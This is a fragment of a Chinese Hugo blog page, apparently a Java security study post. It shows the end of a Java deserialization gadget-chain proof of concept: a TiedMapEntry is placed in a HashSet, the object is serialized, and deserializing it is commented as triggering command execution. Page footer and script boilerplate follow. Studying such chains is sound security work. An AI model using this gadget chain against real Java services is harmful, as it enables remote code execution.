+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 向 HashSet 添加 TiedMapEntry（反序列化时会调用 entry 的 hashCode 触发 get）</span>
+</span></span><span style="display:flex;"><span>hashSet.<span style="color:#a6e22e">add</span>(entry);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 移除 entry 确保反序列化时重新计算 hashCode</span>
+</span></span><span style="display:flex;"><span>lazyMap.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#34;testKey&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ===================== 步骤5：序列化恶意对象 =====================</span>
+</span></span><span style="display:flex;"><span>ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(hashSet);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ===================== 步骤6：反序列化触发漏洞 =====================</span>
+</span></span><span style="display:flex;"><span>ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>(); <span style="color:#75715e">// 触发命令执行</span>
+</span></span><span style="display:flex;"><span>ois.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/java/">Java</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/2025/javasec-urldns/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover.png" loading="lazy" data-key="JavaSec URLDNS" data-hash="/cover.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JavaSec URLDNS</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Byebyedoggy
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.32.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
